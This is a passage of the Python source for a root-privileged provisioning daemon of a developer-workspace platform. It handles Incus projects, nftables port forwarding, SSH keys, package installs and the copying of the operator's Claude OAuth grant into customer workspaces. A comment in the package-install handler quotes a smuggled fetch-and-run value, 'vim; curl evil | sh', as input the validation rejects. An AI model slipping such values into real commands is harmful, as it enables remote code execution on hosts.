#!/usr/bin/env python3
"""The only privileged component in MMD-DEV.

Creating an Incus project or instance needs admin rights on the Incus API.
Giving the web app those rights would mean an RCE in FastAPI is an immediate
full host compromise - unrestricted Incus can mount / into a privileged
container. So provisioning is split out into this daemon:

  * runs as root, but has NO network listener - only a unix socket
  * accepts a fixed allowlist of four verbs; anything else is rejected
  * verifies the caller's uid via SO_PEERCRED
  * re-reads every tier value from the database rather than trusting the
    caller, so a compromised API cannot request a 64-core workspace
  * shells out to workspace/ws-*.sh, so there is exactly one definition of
    what a workspace is

The web app holds a *restricted* Incus certificate and can only start, stop,
exec and resize within existing projects. It cannot reach any of the verbs
below except through this socket.
"""
from __future__ import annotations

import grp
import json
import logging
import os
import pwd
import re
import shlex
import socket
import struct
import subprocess
import sys
import threading
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
WS_CREATE = REPO / "workspace" / "ws-create.sh"
WS_DESTROY = REPO / "workspace" / "ws-destroy.sh"
WS_RESET = REPO / "workspace" / "ws-reset.sh"
AI_USAGE_SCAN = Path(__file__).resolve().parent / "scan_ai_usage.py"
APT_FIXUPS = REPO / "image" / "apt-fixups.sh"
NET_FIXUPS = REPO / "image" / "net-fixups.sh"

SOCKET_PATH = os.environ.get("MMD_PROVISIONER_SOCKET", "/run/mmd/provisioner.sock")
ALLOWED_GROUP = os.environ.get("MMD_GROUP", "mmd")

# Hard ceilings. Even if the database is tampered with, nothing beyond these is
# ever provisioned. Defence in depth behind the Incus project limits.
MAX_CORES = 4
MAX_MEM_MIB = 8192
MAX_ROOT_GIB = 40
MAX_DOCKER_GIB = 40

HERMES_UNIT = """[Unit]
Description=Hermes dashboard
After=network-online.target

[Service]
Type=simple
User=dev
# --host 0.0.0.0 --insecure, and both halves need justifying.
#
# Hermes validates the Host header against the address it bound to, as a
# DNS-rebinding defence (GHSA-ppp5-vxwm-4cf7). Behind a reverse proxy the header
# is the customer's public name, so a bind to the workspace address rejects
# every proxied request with HTTP 400 - measured, not predicted. Binding
# 0.0.0.0 is the documented mode that accepts any Host.
#
# --insecure is required to bind non-loopback, and since the June 2026 hardening
# it NO LONGER disables the auth gate: Hermes still serves its sign-in page and
# still checks the password hash configured below. It relaxes the bind
# restriction only, which is precisely what is needed here.
#
# 0.0.0.0 is not an exposure: nothing DNATs port 9119, the isolation table drops
# bridge-to-bridge traffic, and the host's proxy is the only route in.
ExecStart=/home/dev/.local/bin/hermes dashboard --host 0.0.0.0 --port 9119 --insecure
Restart=on-failure
RestartSec=5
WorkingDirectory=/home/dev

[Install]
WantedBy=multi-user.target
"""

HERMES_GATEWAY_UNIT = """[Unit]
Description=Hermes messaging gateway
After=network-online.target hermes-dashboard.service

[Service]
Type=simple
User=dev
WorkingDirectory=/home/dev
ExecStart=/home/dev/.local/bin/hermes gateway
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
"""

VERBS = {"provision", "archive", "restore", "destroy",
         "expose_port", "unexpose_port", "install_packages",
         "service_ssh", "service_rdp", "service_hermes",
         "fs_list", "fs_pull", "fs_push", "fs_mkdir", "fs_delete",
         "fs_archive", "apt_repair", "ai_claude", "ai_usage", "reset", "ping"}

# ---------------------------------------------------------------------------
# Claude Code sign-in propagation
# ---------------------------------------------------------------------------
# Workspaces are sold with the coding agents already signed in, using the
# operator's own Claude subscription. That means reaching into a host home
# directory and copying something out - the single most dangerous thing this
# daemon does, because ~/.claude also holds the operator's entire working life:
# every repository path they have opened, every conversation, every plan.
#
# So the copy is not a copy. Nothing is read off disk and forwarded verbatim.
# _claude_credentials() parses ~/.claude/.credentials.json, keeps ONLY the keys
# named below, and re-serialises them into a fresh document. Anything the file
# gains in a future Claude Code release - telemetry, machine identifiers,
# account details - is dropped by construction rather than by remembering to
# add it to a blocklist.
CLAUDE_HOST_HOME = Path(os.environ.get("MMD_CLAUDE_HOST_HOME", "/root"))

# The one file consulted. Sessions, history, projects, caches, plans, todos,
# shell snapshots, settings and CLAUDE.md are all in the same directory and are
# never opened.
CLAUDE_AUTH_FILE = ".credentials.json"

# The one top-level key carried across: the OAuth grant itself.
CLAUDE_AUTH_KEYS = ("claudeAiOauth",)

# Never touched. Listed explicitly so the intent is testable and so a reviewer
# can see what was considered, rather than inferring it from an allowlist.
CLAUDE_NEVER_COPY = (
    ".claude.json", "history.jsonl", "settings.json", "CLAUDE.md",
    "projects", "sessions", "session-env", "todos", "tasks", "plans",
    "shell-snapshots", "file-history", "paste-cache", "cache", "downloads",
    "backups", "daemon", "jobs", "plugins", "statsig", "memory",
    "stats-cache.json",
)

# Name of the control plane's restricted client certificate in Incus's trust
# store. The provisioner maintains its project scope; the API itself is
# forbidden from touching the trust store, which is what keeps a compromised
# web app from widening its own access.
API_CERT_NAME = os.environ.get("MMD_API_CERT_NAME", "mmd-api")

# Must match mmd/ports.py. Duplicated deliberately: the provisioner is the
# privileged half and validates independently rather than trusting the caller.
PORT_RANGE_START = 20000
PORT_RANGE_END = 29999

# The uplink interface DNAT rules attach to.
UPLINK_IF = os.environ.get("MMD_UPLINK_IF", "eth0")


def _uplink_addr() -> str:
    try:
        p = subprocess.run(["ip", "-o", "-4", "addr", "show", UPLINK_IF],
                           capture_output=True, text=True, timeout=10)
        return p.stdout.split()[3].split("/")[0]
    except Exception:  # noqa: BLE001
        return "0.0.0.0"


UPLINK_ADDR = _uplink_addr()

log = logging.getLogger("mmd.provisioner")


def _peer_uid(conn: socket.socket) -> tuple[int, int]:
    creds = conn.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED,
                            struct.calcsize("3i"))
    _pid, uid, gid = struct.unpack("3i", creds)
    return uid, gid


def _authorised(uid: int, gid: int) -> bool:
    if uid == 0:
        return True
    try:
        allowed_gid = grp.getgrnam(ALLOWED_GROUP).gr_gid
    except KeyError:
        return False
    if gid == allowed_gid:
        return True
    try:
        name = pwd.getpwuid(uid).pw_name
    except KeyError:
        return False
    return name in grp.getgrgid(allowed_gid).gr_mem


def _clamp(req: dict) -> dict:
    """Never trust the caller's numbers."""
    def iv(key: str, default: int, hi: int) -> int:
        try:
            v = int(req.get(key, default))
        except (TypeError, ValueError):
            v = default
        return max(1, min(v, hi))
    return {
        "cores": iv("cores", 1, MAX_CORES),
        "mem_mib": iv("mem_mib", 1024, MAX_MEM_MIB),
        "root_gib": iv("root_gib", 6, MAX_ROOT_GIB),
        "docker_gib": iv("docker_gib", 4, MAX_DOCKER_GIB),
    }


def _incus_json(args: list[str]) -> object | None:
    try:
        p = subprocess.run(["incus", *args], capture_output=True, text=True,
                           timeout=30, stdin=subprocess.DEVNULL)
        if p.returncode != 0:
            return None
        return json.loads(p.stdout or "null")
    except (subprocess.TimeoutExpired, json.JSONDecodeError):
        return None


def _api_cert_fingerprint() -> str | None:
    certs = _incus_json(["config", "trust", "list", "--format", "json"]) or []
    for c in certs:
        if c.get("name") == API_CERT_NAME:
            return c.get("fingerprint")
    return None


def _set_project_access(project: str, grant: bool) -> None:
    """Add or remove a project from the control plane's certificate scope.

    This is NOT optional bookkeeping. The mmd-api certificate is restricted to
    an explicit project list, and Incus drops a project from that list when the
    project is deleted - it is never re-added when a project of the same name is
    recreated. Without this the control plane ends up scoped to [] and cannot
    start, stop or exec ANY workspace, while provisioning still appears to
    succeed. The failure surfaces much later as a generic 500 on power-on.
    """
    fp = _api_cert_fingerprint()
    if not fp:
        log.warning("certificate %r not found; cannot update project scope", API_CERT_NAME)
        return
    cert = _incus_json(["query", f"/1.0/certificates/{fp}"]) or {}
    projects = set(cert.get("projects") or [])
    projects.add(project) if grant else projects.discard(project)
    payload = json.dumps({"projects": sorted(projects)})
    ok, out = _run(["incus", "query", "--request", "PATCH",
                    f"/1.0/certificates/{fp}", "--data", payload], timeout=30)
    if ok:
        log.info("certificate scope now: %s", sorted(projects))
    else:
        log.error("failed updating certificate scope: %s", out)


PORT_RULES_FILE = "/etc/nftables/mmd-ports.nft"

# Files move between the workspace and the browser through a spool directory
# rather than through this socket. Base64 inside a JSON message would hold an
# entire file in memory twice, in two processes; a spooled file is streamed by
# the API and deleted afterwards.
#
# The file API is routed here at all because a RESTRICTED Incus certificate is
# denied it (403 Forbidden) - reading arbitrary paths inside an instance is
# privileged, and the web app deliberately does not hold that privilege.
# Disk, NOT tmpfs. This was /run/mmd/spool - and /run is a 1.6 GiB tmpfs that
# also holds the provisioner's socket and Incus's config. Staging a customer's
# download there meant a large transfer consumed host RAM and could fill the
# filesystem systemd and sshd depend on, taking every tenant down with it. A
# mistake here should cost disk, which is measurable and recoverable.
SPOOL = "/var/lib/mmd/spool"
MAX_EDIT_BYTES = 2 * 1024 * 1024
MAX_TRANSFER_BYTES = 512 * 1024 * 1024


def _spool_path(token: str) -> str:
    if not re.fullmatch(r"[A-Za-z0-9_-]{8,64}", token or ""):
        raise ValueError("bad spool token")
    return os.path.join(SPOOL, token)


def _safe_path(path: str) -> str | None:
    """Absolute, normalised, no traversal, no NUL.

    The workspace is the customer's own machine, so there is nothing to hide
    from them inside it - this guards the SHAPE of the argument, not their
    reach. A relative path or an embedded newline would let a caller confuse
    the argv boundary.
    """
    if not isinstance(path, str) or not path or len(path) > 4096:
        return None
    if "\0" in path or "\n" in path or "\r" in path:
        return None
    if not path.startswith("/"):
        return None
    norm = os.path.normpath(path)
    return norm if norm.startswith("/") else None


def _sync_port_rules(mappings: list[dict]) -> dict:
    """Rewrite the published-port ruleset to exactly `mappings`.

    Each entry: {external_port, internal_port, protocol, ip}. Everything is
    re-validated here; the privileged half never trusts the caller's numbers.
    """
    pre, out = [], []
    for m in mappings:
        try:
            ext = int(m["external_port"]); intern = int(m["internal_port"])
            ip = str(m["ip"]); proto = str(m.get("protocol", "tcp"))
        except (KeyError, TypeError, ValueError):
            return {"ok": False, "error": "malformed mapping"}
        if not (PORT_RANGE_START <= ext <= PORT_RANGE_END):
            return {"ok": False, "error": f"external port {ext} outside the allowed range"}
        if not (1 <= intern <= 65535):
            return {"ok": False, "error": f"internal port {intern} out of range"}
        if proto not in ("tcp", "udp"):
            return {"ok": False, "error": "protocol must be tcp or udp"}
        if not re.fullmatch(r"10\.42\.0\.\d{1,3}", ip):
            # Only ever forward into the workspace bridge. Without this an
            # attacker who reached this socket could DNAT host traffic anywhere.
            return {"ok": False, "error": f"refusing to forward to {ip}"}
        pre.append(f"        iifname \"{UPLINK_IF}\" {proto} dport {ext} dnat to {ip}:{intern}")
        # Also translate traffic the HOST itself originates toward its own
        # public address. prerouting never sees locally-generated packets, so
        # without this the host (and anything running on it) cannot reach a
        # published port by the address customers are given.
        out.append(f"        {proto} dport {ext} ip daddr {{ {UPLINK_ADDR} }} dnat to {ip}:{intern}")

    ruleset = (
        "#!/usr/sbin/nft -f\n"
        "# Published workspace ports. Regenerated in full by mmd-provisioner.\n"
        "table ip mmd_ports\n"
        "delete table ip mmd_ports\n"
        "table ip mmd_ports {\n"
        "    chain prerouting {\n"
        "        type nat hook prerouting priority dstnat; policy accept;\n"
        + ("\n".join(pre) + "\n" if pre else "")
        + "    }\n"
        "    chain output {\n"
        "        type nat hook output priority dstnat; policy accept;\n"
        + ("\n".join(out) + "\n" if out else "")
        + "    }\n"
        "}\n"
    )
    try:
        os.makedirs(os.path.dirname(PORT_RULES_FILE), exist_ok=True)
        with open(PORT_RULES_FILE, "w") as fh:
            fh.write(ruleset)
    except OSError as exc:
        return {"ok": False, "error": f"cannot write ruleset: {exc}"}

    ok, msg = _run(["nft", "-f", PORT_RULES_FILE], timeout=30)
    if ok:
        log.info("published ports synced: %d mapping(s)", len(pre))
    return {"ok": ok, "output": msg, "count": len(pre)}


def _run_split(cmd: list[str], timeout: int = 900,
               stdin_text: str | None = None) -> tuple[int, str, str]:
    """Like _run but keeps stdout and stderr apart.

    Needed wherever stdout is DATA: `find` exits non-zero if any subdirectory
    is unreadable (xrdp leaves a thinclient_drives mount that is), so a merged
    stream turns a perfectly good listing into a parse error.

    `stdin_text` feeds a program in - used to pipe a script to `python3 -`
    rather than leaving a file behind inside a customer's machine.
    """
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                           input=stdin_text,
                           stdin=None if stdin_text is not None else subprocess.DEVNULL)
    except subprocess.TimeoutExpired:
        return 124, "", "timed out"
    return p.returncode, p.stdout or "", p.stderr or ""


def _run(cmd: list[str], timeout: int = 900,
         stdin_text: str | None = None) -> tuple[bool, str]:
    log.info("exec: %s", " ".join(cmd))
    try:
        if stdin_text is None:
            p = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=timeout, stdin=subprocess.DEVNULL)
        else:
            # Content is piped, never interpolated into a shell string - the
            # only safe way to move a customer's key material into a file.
            p = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=timeout, input=stdin_text)
    except subprocess.TimeoutExpired:
        return False, "timed out"
    out = (p.stdout or "") + (p.stderr or "")
    return p.returncode == 0, out.strip()[-4000:]


# Mirrors mmd/sshkeys.py. Duplicated on purpose: this side runs as root and
# validates independently rather than trusting that the caller did.
SSH_KEY_TYPES = {
    "ssh-ed25519", "sk-ssh-ed25519@openssh.com", "ssh-rsa",
    "rsa-sha2-256", "rsa-sha2-512", "ecdsa-sha2-nistp256",
    "ecdsa-sha2-nistp384", "ecdsa-sha2-nistp521",
    "sk-ecdsa-sha2-nistp256@openssh.com",
}


def _check_authorized_keys(body: str) -> str | None:
    """Return an error string, or None if every line is a plain public key."""
    lines = [l.strip() for l in (body or "").splitlines()]
    real = [l for l in lines if l and not l.startswith("#")]
    if not real:
        return "no keys supplied"
    if len(real) > 10:
        return "too many keys"
    for line in real:
        parts = line.split(None, 2)
        if len(parts) < 2:
            return "malformed key line"
        if parts[0] not in SSH_KEY_TYPES:
            # Also what rejects an options prefix such as command="...".
            return f"unsupported key type {parts[0][:30]!r}"
        if not re.fullmatch(r"[A-Za-z0-9+/]+={0,3}", parts[1]):
            return "key body is not base64"
        if len(parts) > 2 and not re.fullmatch(r"[\w.@+/:\- ]{0,200}", parts[2]):
            return "key comment contains unsupported characters"
    return None


SSHD_DROPIN = """# Managed by MMD-DEV.
# Keys only. This listener is reachable from the internet on a reserved port,
# and password authentication there is brute-forced continuously.
PasswordAuthentication no
KbdInteractiveAuthentication no
PermitRootLogin no
PermitEmptyPasswords no
PubkeyAuthentication yes
X11Forwarding no
MaxAuthTries 3
ClientAliveInterval 120
"""


def _apply_fixup_script(project: str, path: Path, slug: str,
                        timeout: int = 900) -> tuple[bool, str]:
    """Copy a fixup script into a workspace and run it there.

    The file in this repository is the single source of truth: the golden image
    runs it at build time, and this runs the very same file on machines built
    before it existed. Every fixup is idempotent, so calling them on each
    provision costs a few seconds and removes any question of which machines
    have them.

    Piped in on stdin rather than staged on a shared path: the content is the
    repository's, not the customer's, and it lands somewhere only root inside
    that workspace can write.
    """
    try:
        script = path.read_text()
    except OSError as e:  # noqa: BLE001
        return False, f"cannot read {path}: {e}"

    target = f"/usr/local/sbin/mmd-{slug}"
    ok, out = _run(["incus", "exec", "ws", "--project", project, "--", "bash", "-lc",
                    f"cat > {target} && chmod 0755 {target}"],
                   timeout=120, stdin_text=script)
    if not ok:
        return False, f"could not install the fixup script: {out[-300:]}"

    ok, out = _run(["incus", "exec", "ws", "--project", project,
                    "--env", "DEBIAN_FRONTEND=noninteractive", "--",
                    "bash", "-lc", f"{target} 2>&1"],
                   timeout=timeout)
    return ok, (out or "")[-1000:]


def _apply_apt_fixups(project: str) -> tuple[bool, str]:
    """Install the apt configuration that makes `apt install firefox` work.

    Ubuntu ships firefox as a stub that installs a snap, and snaps cannot run in
    an unprivileged container - the install hook fails and leaves dpkg wedged.
    image/apt-fixups.sh replaces it with Mozilla's real .deb repository.
    """
    return _apply_fixup_script(project, APT_FIXUPS, "apt-fixups")


def _apply_net_fixups(project: str) -> tuple[bool, str]:
    """Grant the file capabilities dpkg could not.

    `ping` arrives with no cap_net_raw because iputils-ping's postinst calls
    setcap, and that call fails silently under an unprivileged dpkg. It cannot
    be baked into the golden image either: idmap.isolated gives every workspace
    its own uid range, and a capability xattr embeds the rootid of the namespace
    it was set in. See image/net-fixups.sh.
    """
    return _apply_fixup_script(project, NET_FIXUPS, "net-fixups", timeout=300)


def _measure(project: str, path: str) -> tuple[int | None, str]:
    """How many bytes a path holds, measured INSIDE the workspace.

    The point is that this runs before anything is copied. Both download paths
    used to pull first and check the size afterwards, which meant the guard fired
    only once the host had already absorbed the data - and with the spool on
    tmpfs, "absorbed" meant host RAM. A customer clicking "download zip" on a
    home directory could fill the filesystem the provisioner's own socket lives
    in.

    `du -sb` is apparent size and does not follow symlinks, which matches what
    the archiver actually writes.
    """
    rc, out, err = _run_split(["incus", "exec", "ws", "--project", project, "--",
                               "du", "-sb", "--", path], timeout=300)
    first = (out or "").strip().split("\t")[0].split()[0] if (out or "").strip() else ""
    if not first.isdigit():
        return None, (err or out or "could not measure the path")[-200:]
    return int(first), ""


def _claude_credentials() -> tuple[dict | None, str]:
    """Build the credential document to place in a workspace.

    Reads exactly one file - CLAUDE_HOST_HOME/.claude/.credentials.json - and
    rebuilds it from the allowlisted keys only. The returned dict is what gets
    written; the file on the host is never streamed through.
    """
    src = CLAUDE_HOST_HOME / ".claude" / CLAUDE_AUTH_FILE
    try:
        raw = json.loads(src.read_text())
    except FileNotFoundError:
        return None, "the platform account is not signed in on this host"
    except (OSError, ValueError) as e:  # noqa: BLE001
        return None, f"the platform credentials are unreadable: {e}"
    if not isinstance(raw, dict):
        return None, "the platform credentials are malformed"

    out = {k: raw[k] for k in CLAUDE_AUTH_KEYS if k in raw}
    grant = out.get("claudeAiOauth")
    if not isinstance(grant, dict) or not grant.get("accessToken"):
        return None, "the platform account is not signed in on this host"
    return out, ""


def _claude_expiry() -> int | None:
    creds, _ = _claude_credentials()
    if not creds:
        return None
    v = creds["claudeAiOauth"].get("refreshTokenExpiresAt")
    return int(v) if isinstance(v, (int, float)) else None


# Written into the workspace so Claude Code starts straight into a prompt.
# SYNTHESISED, not copied: the host's own ~/.claude.json is 59 kB of the
# operator's history - every repository they have opened, their account record,
# their feature flags - and none of it is needed to be signed in.
#
# `hasCompletedOnboarding` is the load-bearing key, and it is easy to
# under-rate. Without it an interactive `claude` opens the first-run wizard -
# "Welcome to Claude Code / Let's get started / Choose the text style" - which
# customers reasonably report as "it is asking me to log in". Measured: two
# HOMEs identical but for this key, one shows the wizard and the other goes
# straight to the prompt. Credentials are valid either way; `claude -p` answers
# normally in both, which is why this was invisible to every non-interactive
# check.
CLAUDE_MIN_CONFIG = {"hasCompletedOnboarding": True}

# Merged into whatever ~/.claude.json already holds, rather than written only
# when the file is absent.
#
# THE BUG THIS REPLACES: the old code was `[ -e ~/.claude.json ] && exit 0`.
# Claude Code writes that file itself on its very FIRST run, before the customer
# has finished anything - so from the moment they typed `claude` once, the
# resync button could never set the onboarding key again. It reported success
# every time and changed nothing, which is exactly what "I clicked resync and it
# still asks me to log in" looks like from the outside.
#
# Merging keeps the instinct the old comment had right - the customer may have
# their own settings by now and we must not flatten them - while still
# guaranteeing the handful of keys the platform needs.
CLAUDE_CONFIG_MERGE = r"""
import json, os, shutil, sys, tempfile

path = "/home/dev/.claude.json"
want = json.load(sys.stdin)

current = {}
if os.path.exists(path):
    try:
        with open(path) as fh:
            current = json.load(fh)
        if not isinstance(current, dict):
            raise ValueError("not a JSON object")
    except (ValueError, OSError):
        # Never silently destroy it. A corrupt config is still the customer's,
        # and it is the only copy of whatever they had configured.
        shutil.move(path, path + ".corrupt")
        current = {}

merged = dict(current)
merged.update(want)
if merged == current and os.path.exists(path):
    print("claude-config: already correct")
    raise SystemExit(0)

# Written to a temporary file in the same directory and renamed, so a crash
# mid-write cannot leave a truncated config behind.
fd, tmp = tempfile.mkstemp(dir=os.path.dirname(path), prefix=".claude.json.")
try:
    with os.fdopen(fd, "w") as fh:
        json.dump(merged, fh, indent=2)
    os.chmod(tmp, 0o600)
    shutil.chown(tmp, "dev", "dev")
    os.replace(tmp, path)
finally:
    if os.path.exists(tmp):
        os.unlink(tmp)
print("claude-config: merged %d key(s)" % len(want))
"""


# Reads the one key that decides whether `claude` starts into a prompt or into
# the first-run wizard. Kept as its own snippet so the status check and the
# merge cannot drift apart about what "configured" means.
_ONBOARDED_PROBE = (
    "import json;"
    "print(json.load(open('/home/dev/.claude.json')).get('hasCompletedOnboarding') is True)"
)


def _claude_status(project: str) -> dict:
    rc, out, _ = _run_split(
        ["incus", "exec", "ws", "--project", project, "--", "bash", "-lc",
         "v=$(su - dev -c 'claude --version' 2>/dev/null | head -1); "
         f"o=$(python3 -c \"{_ONBOARDED_PROBE}\" 2>/dev/null); "
         "printf 'version=%s\\nlinked=%s\\nonboarded=%s\\n' "
         "  \"${v:-}\" "
         "  \"$([ -s /home/dev/.claude/.credentials.json ] && echo yes || echo no)\" "
         "  \"${o:-False}\""],
        timeout=120)
    info = dict(ln.split("=", 1) for ln in (out or "").splitlines() if "=" in ln)
    version = (info.get("version") or "").strip()
    return {"installed": bool(version), "version": version or None,
            "linked": info.get("linked", "no").strip() == "yes",
            # Credentials make you signed in; this makes `claude` usable without
            # walking a wizard first. The interface needs both to say "ready".
            "onboarded": info.get("onboarded", "False").strip() == "True"}


def _verb_ai_claude(project: str, req: dict) -> dict:
    action = req.get("action")
    if action not in ("status", "install", "unlink"):
        return {"ok": False, "error": "action must be status, install or unlink"}

    if action == "status":
        st = _claude_status(project)
        creds, why = _claude_credentials()
        return {"ok": True, **st, "available": creds is not None,
                "unavailable_reason": why or None,
                "expires_at": _claude_expiry()}

    if action == "unlink":
        ok, out = _run(["incus", "exec", "ws", "--project", project, "--", "bash", "-lc",
                        "rm -f /home/dev/.claude/.credentials.json"], timeout=120)
        return {"ok": ok, "output": (out or "")[-300:], **_claude_status(project)}

    # --- install -----------------------------------------------------------
    creds, why = _claude_credentials()
    if creds is None:
        return {"ok": False, "error": why}

    st = _claude_status(project)
    if not st["installed"]:
        # The golden image installs it already; this covers machines built
        # before that, and any customer who removed it.
        ok, out = _run(["incus", "exec", "ws", "--project", project, "--", "bash", "-lc",
                        "command -v npm >/dev/null || exit 90; "
                        "npm install -g --no-fund --no-audit @anthropic-ai/claude-code"],
                       timeout=900)
        if not ok:
            return {"ok": False, "error": "install failed",
                    "output": (out or "")[-800:]}

    # Written through stdin, so no token ever appears in a command line or in
    # the provisioner's own log. Created 0600 under a 0700 directory before
    # anything is written into it.
    ok, out = _run(["incus", "exec", "ws", "--project", project, "--", "bash", "-lc",
                    "install -d -m 0700 -o dev -g dev /home/dev/.claude && "
                    "install -m 0600 -o dev -g dev /dev/null "
                    "  /home/dev/.claude/.credentials.json && "
                    "cat > /home/dev/.claude/.credentials.json"],
                   timeout=120, stdin_text=json.dumps(creds))
    if not ok:
        return {"ok": False, "error": "could not write credentials",
                "output": (out or "")[-300:]}

    cfg_ok, cfg_out = _run(
        ["incus", "exec", "ws", "--project", project, "--",
         "python3", "-c", CLAUDE_CONFIG_MERGE],
        timeout=120, stdin_text=json.dumps(CLAUDE_MIN_CONFIG))
    if not cfg_ok:
        return {"ok": False, "error": "could not write the Claude configuration",
                "output": (cfg_out or "")[-300:]}

    st = _claude_status(project)
    # `linked` alone is not enough to promise a working `claude`. A machine with
    # valid credentials but no onboarding key opens the first-run wizard, and
    # reporting that as success is how the resync button came to lie.
    return {"ok": st["linked"] and st["onboarded"], **st, "available": True,
            "expires_at": _claude_expiry()}


def handle(req: dict) -> dict:
    verb = req.get("verb")
    if verb not in VERBS:
        return {"ok": False, "error": f"unknown verb: {verb!r}"}
    if verb == "ping":
        return {"ok": True, "pong": True}

    try:
        idx = int(req["idx"])
    except (KeyError, TypeError, ValueError):
        return {"ok": False, "error": "idx required"}
    if not (1 <= idx <= 9999):
        return {"ok": False, "error": "idx out of range"}

    if verb == "provision":
        t = _clamp(req)
        ok, out = _run([
            "bash", str(WS_CREATE), str(idx),
            str(t["cores"]), str(t["mem_mib"]),
            str(t["root_gib"]), str(t["docker_gib"]),
        ])
        if ok:
            _set_project_access(f"ws-{idx}", grant=True)
            # ws-create leaves the instance running, so the apt configuration
            # can be applied straight away. A failure here is NOT fatal: the
            # customer has a working machine, just one where `apt install
            # firefox` still misbehaves, and that is repairable later.
            fx_ok, fx_out = _apply_apt_fixups(f"ws-{idx}")
            _apply_net_fixups(f"ws-{idx}")
            if not fx_ok:
                log.warning("apt fixups failed for ws-%s: %s", idx, fx_out[-300:])
            return {"ok": True, "output": out, "tier": t, "apt_fixups": fx_ok}
        return {"ok": ok, "output": out, "tier": t}

    if verb == "destroy":
        ok, out = _run(["bash", str(WS_DESTROY), str(idx), "--yes"])
        if ok:
            _set_project_access(f"ws-{idx}", grant=False)
        return {"ok": ok, "output": out}

    project = f"ws-{idx}"

    if verb in ("expose_port", "unexpose_port"):
        # Deliberately NOT an Incus proxy device.
        #
        # The project sets restricted.devices.proxy=block, and that restriction
        # binds the PROJECT - not merely restricted certificates - so even root
        # is refused ("Proxy devices are forbidden"). Relaxing it would let
        # anything holding the control plane's certificate bind arbitrary host
        # ports, including 443 and 22, which is exactly the capability worth
        # denying.
        #
        # Plain nftables DNAT does the same job entirely in the kernel, is
        # faster than a userspace relay, and needs no Incus privilege at all.
        # The API owns the mapping table and sends the complete desired set on
        # every change, so this is idempotent and self-healing rather than a
        # sequence of deltas that can drift.
        return _sync_port_rules(req.get("mappings") or [])

    if verb == "reset":
        # Destroys the customer's machine and builds a new one from the golden
        # image. The confirmation that makes this safe - password, typed
        # acknowledgement - is the API's job; by the time it reaches here the
        # decision has been made and this simply carries it out.
        t = _clamp(req)
        ok, out = _run([
            "bash", str(WS_RESET), str(idx),
            str(t["cores"]), str(t["mem_mib"]),
            str(t["root_gib"]), str(t["docker_gib"]),
        ], timeout=1800)
        if not ok:
            return {"ok": False, "output": out[-2000:], "tier": t}
        # A fresh machine carries the same apt problem a fresh provision does.
        fx_ok, fx_out = _apply_apt_fixups(project)
        if not fx_ok:
            log.warning("apt fixups failed after reset of ws-%s: %s", idx, fx_out[-300:])
        # A reset rebuilds the filesystem from the golden image, which takes the
        # ping capability with it - so this is not optional housekeeping here.
        _apply_net_fixups(project)
        return {"ok": True, "output": out[-2000:], "tier": t, "apt_fixups": fx_ok}

    if verb == "ai_usage":
        # Counted INSIDE the workspace. The session logs run to tens of
        # megabytes; pulling them to the host to parse them here would repeat
        # the mistake the zip download made, and would put a customer's
        # conversations on the host for no reason. Only totals come back.
        try:
            script = AI_USAGE_SCAN.read_text()
        except OSError as e:  # noqa: BLE001
            return {"ok": False, "error": f"cannot read {AI_USAGE_SCAN}: {e}"}

        # Piped to `python3 -` rather than written to the workspace: this runs
        # every few minutes and leaving a file behind on a machine the customer
        # owns, to be found and wondered about, is worse than passing it on
        # stdin each time.
        rc, out, err = _run_split(
            ["incus", "exec", "ws", "--project", project, "--",
             "su", "-", "dev", "-c", "python3 - ~/.claude/projects"],
            timeout=300, stdin_text=script)
        if not (out or "").strip():
            return {"ok": False, "error": (err or "scanner produced no output")[-300:]}
        try:
            data = json.loads(out)
        except ValueError:
            return {"ok": False, "error": f"unparseable scanner output: {out[:200]}"}
        return {"ok": True, **data}

    if verb == "ai_claude":
        return _verb_ai_claude(project, req)

    if verb == "apt_repair":
        # Repairs both families. They share a cause - dpkg cannot do privileged
        # things inside an unprivileged container - and an operator reaching for
        # "repair" wants the machine working, not one named subsystem.
        net_ok, net_out = _apply_net_fixups(project)
        ok, out = _apply_apt_fixups(project)
        if not net_ok:
            out = f"{net_out}\n{out}"
        return {"ok": ok, "output": out}

    if verb == "install_packages":
        # Independent validation. The API validates too, but this side runs as
        # root and must never rely on the caller having done so: a name like
        # "vim; curl evil | sh" has to be unrepresentable here, not merely
        # escaped somewhere upstream.
        names = req.get("packages") or []
        if not isinstance(names, list) or not names:
            return {"ok": False, "error": "packages must be a non-empty list"}
        if len(names) > 40:
            return {"ok": False, "error": "too many packages"}
        clean = []
        for n in names:
            n = str(n).strip().lower()
            if not re.fullmatch(r"[a-z0-9][a-z0-9+.\-]{0,60}", n):
                return {"ok": False, "error": f"invalid package name: {n[:40]!r}"}
            clean.append(n)
        # Passed as separate argv entries, never through a shell string.
        ok, out = _run([
            "incus", "exec", "ws", "--project", project,
            "--env", "DEBIAN_FRONTEND=noninteractive", "--",
            "bash", "-lc",
            "apt-get update -qq && apt-get install -y -qq --no-install-recommends "
            + " ".join(clean),
        ], timeout=900)
        return {"ok": ok, "output": out[-2000:], "packages": clean}

    if verb == "service_ssh":
        action = req.get("action")
        if action not in ("enable", "disable"):
            return {"ok": False, "error": "action must be enable or disable"}

        if action == "disable":
            ok, out = _run(["incus", "exec", "ws", "--project", project, "--",
                            "bash", "-lc",
                            "systemctl disable --now ssh ssh.socket 2>/dev/null; "
                            "systemctl is-active ssh"], timeout=120)
            # `systemctl is-active` exits non-zero when inactive, which is the
            # outcome we want - so success is judged by the port, not the code.
            ok2, listening = _run(["incus", "exec", "ws", "--project", project, "--",
                                   "bash", "-lc",
                                   "systemctl disable --now ssh.socket 2>/dev/null; "
                                   "ss -tln | grep -c ':22 ' || true"],
                                  timeout=60)
            still = (listening or "").strip().splitlines()[-1:] or ["?"]
            return {"ok": still[0] == "0", "listening": still[0], "output": out[-500:]}

        keys = req.get("authorized_keys") or ""
        problem = _check_authorized_keys(keys)
        if problem:
            return {"ok": False, "error": problem}

        # Write the key file by piping, then apply ownership and mode. sshd
        # refuses to use an authorized_keys file that is group- or
        # world-writable, so the mode is not cosmetic.
        ok, out = _run(["incus", "exec", "ws", "--project", project, "--",
                        "bash", "-lc",
                        "install -d -m 700 -o dev -g dev /home/dev/.ssh && "
                        "cat > /home/dev/.ssh/authorized_keys && "
                        "chown dev:dev /home/dev/.ssh/authorized_keys && "
